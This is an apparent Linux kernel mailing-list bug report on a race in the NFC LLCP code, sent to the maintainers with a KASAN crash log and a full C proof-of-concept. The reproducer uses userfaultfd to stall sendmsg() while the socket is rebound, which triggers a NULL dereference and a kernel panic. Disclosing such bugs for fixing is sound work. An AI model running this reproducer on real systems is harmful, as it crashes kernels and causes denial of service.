Received: from mail-yw1-f169.google.com (mail-yw1-f169.google.com [209.85.128.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5946320DD51
	for <oe-linux-nfc@lists.linux.dev>; Tue, 14 Jul 2026 00:00:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783987253; cv=none; b=dh9hh+4as0reS4AX5jsAIuGDT8C2Mc7NbaIV9Pz9S2THmMpVHE/W47J06lBpdNu0PXKOeZi6Uxk7dYBPLDNgg4Y2/+dxIEmu8MTFTU1/zLhxdPV2VlaOw6TuD8xDsPBBAjrZSit+gnBuEJGmuNrgbfLuN3kJuZwebeP0lm0U+tA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783987253; c=relaxed/simple;
	bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=qoOYlz8u+O7FzADlN0KU71uVbVp3zbKPQ8WsTnzyB5Zmj2uk4bpre64GeCKoNHLuz8SR6s4vUbWRm65AGcyfnaYzrPO27nR0v2vDQyC0aZqCPO/v9epFOVoeqx7uSG//q7DwWIZVtpilRJHvn2qaiwroCw0JhKn09qgJJ2VV4eI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=AxI6TBSP; arc=none smtp.client-ip=209.85.128.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="AxI6TBSP"
Received: by mail-yw1-f169.google.com with SMTP id 00721157ae682-80e24970f1dso3713317b3.0
        for <oe-linux-nfc@lists.linux.dev>; Mon, 13 Jul 2026 17:00:51 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1783987250; x=1784592050; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:subject:from:cc:to
         :content-language:user-agent:mime-version:date:message-id:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
        b=AxI6TBSP6k4yxQcDYR11VsLq5WSgtND8a38NxICBJBBdZ+cZMnyOTMx6IWPQnh7p/O
         dG9E7Ao4iUhK4hepy5vf4moK/NWAvCG4/dV9LklTxgCqTMhG0kMKo1QRCxHcFS4I7ZPF
         VGXbTow9AwA/cwpf8ZLn1Pgu3AssLp/lzrYF3gnd53OhIklTtYLHBjHeTVCUBKyo8Ojc
         e+vUa9KB/LGCctRSWs3FgPbFTM7hSiTI/xI54xVO2TuUQ8CgmVxjkO4gn0kRXgUG0wDS
         kMYHdCLjNBm9R5k7hQCRisFQoDUSwM8pf9ct1PrmvKIYnULmGmsswF0VnO5HpKVXiyUG
         S4Mw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1783987250; x=1784592050;
        h=content-transfer-encoding:content-type:subject:from:cc:to
         :content-language:user-agent:mime-version:date:message-id:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
        b=j3okuOgcsun+Ekx43C8kuBR2A4ROYpcJ0yrOB2sfdGWU28dDo3TmZGFFTQh+qAgAdn
         UFiLtqQgTZKInCK3vm0p6FVznnhKV8e09rBLGLW81wWug8MHlVBQxNWLlVra7HPST2gJ
         nyDwd17LLcAq9o8G/6QVTL9Vg2prl/B8E7lMtrLE4wZkosPuwPp/Kv1pvvu2BrPF97xT
         /wgenuMFkKn76HsxTaXa/Lyv8dVy9fTHct8kJv9G12Km7t3W4bys0F2pZ/ZxN6HCnhe4
         5iwrHqfi94CRhkKIJpcSCG3VRc0J3zZT72Br5He7uA532n99WGJ0XWCr5RsU4ezQBUXS
         4p3A==
X-Forwarded-Encrypted: i=1; AHgh+RpxGD4JA+mz1qSMUWwlIP1Q1glO179WlQf9wSTQ5pIZCLEijQbx6k7O0u6YSds6R0VxXEnvJnffSstl4Qk=@lists.linux.dev
X-Gm-Message-State: AOJu0Yz1vEK+Wo6NsQLHSRVjgXQihg/CcJuXkDkbGdgLzPbFDchXXtAt
	ZaSMerEtDvCgghGKa5CUUc6Th9BF2CmsCbHrAD82pemuqVe4Mw5zd8pD
X-Gm-Gg: AfdE7cmjVTUFREV19Vh3bQiDamdDKm7D1YvDekS/2FmUu6AwW6LY+8NWjUXcsi+ICkJ
	NvYPw+QVbdXy+Y1l8XQc127nyJhVh89Rd+EBQkLUfLfyI9twxiRzoYb1WE71jk8F05VxMRn7c0c
	nUYuvDDoHb509zHx2bw1G8LPDF86Wy4ge0WjmZH0uRi3VsowcFnNdn898dl2Z0/T21jHluZwH3r
	XGdq7jDD753jQfa8lAZorCeACeh/yP50/Kbg//emsB5AjspHPiie/sMeZPE6H075GKB2IlPLHHb
	gpybbyfqKOroD8wbpLiD/jRfvxfAJJHimynx8Kf5iuWpth+YcRG4crHUEPmDLmtMluN0ngxVGVo
	XeQAqMxrRakfb4f+bTU0+JYDk4cVw1w304o+sRpDXHXaoksaoQgKtxQxtD37e7MGPCYAKsbmYQy
	LyFMaWmPHD31WFwn4+zpaa
X-Received: by 2002:a53:c34a:0:b0:667:c09c:4a34 with SMTP id 956f58d0204a3-667d7b0040fmr5216981d50.11.1783987249986;
        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
Received: from [141.223.124.60] ([141.223.124.60])
        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-66787ad3833sm14824607d50.20.2026.07.13.17.00.46
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
Message-ID: <a89d0419-8bcf-40a2-b52d-3e5d911f11da@gmail.com>
Date: Tue, 14 Jul 2026 09:00:45 +0900
Precedence: bulk
X-Mailing-List: oe-linux-nfc@lists.linux.dev
List-Id: <oe-linux-nfc.lists.linux.dev>
List-Subscribe: <mailto:oe-linux-nfc+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:oe-linux-nfc+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: david@ixit.cz
Cc: krzk@kernel.org, davem@davemloft.net, edumazet@google.com,
 kuba@kernel.org, pabeni@redhat.com, horms@kernel.org,
 oe-linux-nfc@lists.linux.dev, netdev@vger.kernel.org,
 linux-kernel@vger.kernel.org, jdoh.kernel@gmail.com
From: Junwoong Doh <jdoh.kernel@gmail.com>
Subject: [BUG] nfc: llcp: race between nfc_llcp_send_ui_frame() and
 llcp_sock_bind() dereferences NULL sock->dev
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Hello,

Commit dded08927ca3 ("nfc: llcp: fix NULL error pointer dereference on
sendmsg() after failed bind()") added a NULL check for llcp_sock->local
in llcp_sock_sendmsg(), but it does not handle all the races.
The thread interleaving is the same as Krzysztof mentioned:
https://lore.kernel.org/oe-linux-nfc/20220119074816.6505-2-krzysztof.kozlowski@canonical.com/

In detail:
nfc_llcp_send_ui_frame() checks sock->local == NULL, but it is called
without socket's lock held, which opens a window for a race condition.
Between the sock->local == NULL check and the sock->dev use in
nfc_alloc_send_skb(), llcp_sock_bind() can run concurrently and set
both sock->local and sock->dev to NULL.
This leads to NULL pointer dereference in the nfc_alloc_send_skb() call.
Moreover, the window can be enlarged by the
memcpy_from_msg(msg_data, msg, len) call that sits between
the sock->local check and the sock->dev use.

I used /dev/virtual_nci to set up a virtual NFC device,
so the reproducer must be executed as root:
  gcc repro.c -o repro -static -lpthread
  ./repro

Reproduced crash log:
==================================================================
[   46.787552][ T9432] Oops: general protection fault, probably for non-canonical address 0xdffffc00000000b4: 0000 [#1] SMP KASAN NOPTI
[   46.787982][ T9432] KASAN: null-ptr-deref in range [0x00000000000005a0-0x00000000000005a7]
[   46.788264][ T9432] CPU: 0 UID: 0 PID: 9432 Comm: minimize Not tainted 7.2.0-rc3 #3 PREEMPT(full) 
[   46.788565][ T9432] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   46.788869][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
[   46.789080][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
[   46.789707][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
[   46.789909][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
[   46.790164][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
[   46.790418][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
[   46.790672][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
[   46.790928][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
[   46.791184][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
[   46.791470][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.791684][ T9432] CR2: 00000000004b0270 CR3: 00000000287d4000 CR4: 00000000000006f0
[   46.791942][ T9432] Call Trace:
[   46.792052][ T9432]  <TASK>
[   46.792150][ T9432]  nfc_llcp_send_ui_frame+0x412/0x690
[   46.792331][ T9432]  ? __pfx_nfc_llcp_send_ui_frame+0x10/0x10
[   46.792526][ T9432]  ? llcp_sock_sendmsg+0x300/0x480
[   46.792696][ T9432]  ? __local_bh_enable_ip+0xa4/0x120
[   46.792877][ T9432]  llcp_sock_sendmsg+0x364/0x480
[   46.793042][ T9432]  ? bpf_lsm_socket_sendmsg+0x9/0x10
[   46.793217][ T9432]  ? __pfx_llcp_sock_sendmsg+0x10/0x10
[   46.793398][ T9432]  ____sys_sendmsg+0xa27/0xb90
[   46.793560][ T9432]  ? __pfx_____sys_sendmsg+0x10/0x10
[   46.793734][ T9432]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[   46.793929][ T9432]  ? find_held_lock+0x2b/0x80
[   46.794085][ T9432]  ? clockevents_program_event+0x27c/0x990
[   46.794278][ T9432]  ___sys_sendmsg+0x11c/0x1b0
[   46.794436][ T9432]  ? __pfx____sys_sendmsg+0x10/0x10
[   46.794611][ T9432]  ? __fget_files+0x1fb/0x3b0
[   46.794770][ T9432]  __sys_sendmsg+0x142/0x1f0
[   46.794926][ T9432]  ? __pfx___sys_sendmsg+0x10/0x10
[   46.795097][ T9432]  ? __cpu_to_node+0x8a/0x130
[   46.795256][ T9432]  do_syscall_64+0x11f/0x830
[   46.795414][ T9432]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   46.795608][ T9432] RIP: 0033:0x453cfd
[   46.795738][ T9432] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 86 02 00 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 86 02 00 48
[   46.796354][ T9432] RSP: 002b:00007f788883d0d0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
[   46.796623][ T9432] RAX: ffffffffffffffda RBX: 00007f788883d640 RCX: 0000000000453cfd
[   46.796879][ T9432] RDX: 0000000000000000 RSI: 00007f788883d120 RDI: 0000000000000006
[   46.797133][ T9432] RBP: 00007f788883d1d0 R08: 0000000000000000 R09: 00007ffe3551378f
[   46.797387][ T9432] R10: 0000000000000008 R11: 0000000000000293 R12: 00007f788883d640
[   46.797641][ T9432] R13: 0000000000000000 R14: 0000000000415330 R15: 00007f788803d000
[   46.797912][ T9432]  </TASK>
[   46.798017][ T9432] Modules linked in:
[   46.798231][ T9432] ---[ end trace 0000000000000000 ]---
[   46.813550][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
[   46.813783][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
[   46.814427][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
[   46.814632][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
[   46.814900][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
[   46.815161][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
[   46.815423][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
[   46.815684][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
[   46.815948][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
[   46.816243][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.816462][ T9432] CR2: 00007f871e9f90a0 CR3: 00000000287d4000 CR4: 00000000000006f0
[   46.816725][ T9432] Kernel panic - not syncing: Fatal exception
[   46.817025][ T9432] Kernel Offset: disabled
[   46.817173][ T9432] Rebooting in 86400 seconds..
==================================================================

C reproducer:
==================================================================
#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/nfc.h>
#include <linux/userfaultfd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define IOCTL_GET_NCIDEV_IDX 0

static void fatal(const char *m) {
    perror(m);
    exit(1);
}

static int new_llcp_sock(void) {
    int s = socket(AF_NFC, SOCK_DGRAM, NFC_SOCKPROTO_LLCP);
    if (s < 0) {
        fatal("socket");
    }
    return s;
}

static int do_bind(int s, uint32_t devidx, const char *name) {
    struct sockaddr_nfc_llcp a = {
        .sa_family = AF_NFC,
        .dev_idx   = devidx,
        .dsap      = 0,
        .ssap      = 1
    };
    strncpy(a.service_name, name, sizeof(a.service_name));
    a.service_name_len = strlen(name);
    return bind(s, (struct sockaddr *)&a, sizeof(a));
}

static int open_dev(uint32_t *idx) {
    int fd = open("/dev/virtual_nci", O_RDWR);
    if (fd < 0) {
        fatal("open /dev/virtual_nci");
    }
    if (ioctl(fd, IOCTL_GET_NCIDEV_IDX, idx) < 0) {
        fatal("GET_NCIDEV_IDX");
    }
    return fd;
}

static int victim;
static void *payload;

static void *sender(void *arg) {
    struct iovec iov = {
        .iov_base = payload,
        .iov_len = 0x1000
    };
    struct sockaddr_nfc_llcp vdest = {
        .sa_family = AF_NFC,
        .dsap = 1,
        .ssap = 6
    };
    struct msghdr msg = {
        .msg_name    = &vdest,
        .msg_namelen = sizeof(vdest),
        .msg_iov     = &iov,
        .msg_iovlen  = 1
    };
    sendmsg(victim, &msg, 0);
    return NULL;
}

int init_userfaultfd() {
    int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0) {
        fatal("userfaultfd");
    }
    struct uffdio_api api = {
        .api = UFFD_API
    };
    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
        fatal("UFFDIO_API");
    }
    
    payload = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (payload == MAP_FAILED) {
        fatal("mmap");
    }
    struct uffdio_register reg = {
        .range = {
            .start = (unsigned long)payload,
            .len = 0x1000
        },
        .mode  = UFFDIO_REGISTER_MODE_MISSING,
    };  
    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
        fatal("UFFDIO_REGISTER");
    }

    return uffd;
}

int main(void) {
    uint32_t idx_live, idx_kill;

    int fd_live = open_dev(&idx_live);
    int helper  = new_llcp_sock();
    if (do_bind(helper, idx_live, "collide") < 0) {
        fatal("helper bind");
    }
    
    int fd_kill = open_dev(&idx_kill);
    victim = new_llcp_sock();
    if (do_bind(victim, idx_kill, "victim") < 0) {
        fatal("victim bind");
    }
    
    int uffd = init_userfaultfd();
    
    pthread_t th;
    if (pthread_create(&th, NULL, sender, payload)) {
        fatal("pthread_create");
    }
    
    // Execute after page fault raised
    struct pollfd pfd = {
        .fd = uffd,
        .events = POLLIN
    };
    if (poll(&pfd, 1, -1) < 0) {
        fatal("poll");
    }
    struct uffd_msg um;
    if (read(uffd, &um, sizeof(um)) != sizeof(um)) {
        fatal("read uffd");
    }
    
    close(fd_kill);
    do_bind(victim, idx_live, "collide");

    struct uffdio_zeropage zp = {
        .range = {
            .start = payload,
            .len = 0x1000,
        },
    };
    ioctl(uffd, UFFDIO_ZEROPAGE, &zp); // Resume sendmsg()

    return 0;
}
==================================================================

Kernel commit: a13c140cc289c0b7b3770bce5b3ad42ab35074aa (v7.2-rc3)
Config: https://gist.githubusercontent.com/dandb3/199109d95bd174cb8bd446ed01055861/raw/6889acdc95db08c35d7c5d3288e352da8edaa775/.config

Thanks,
Junwoong

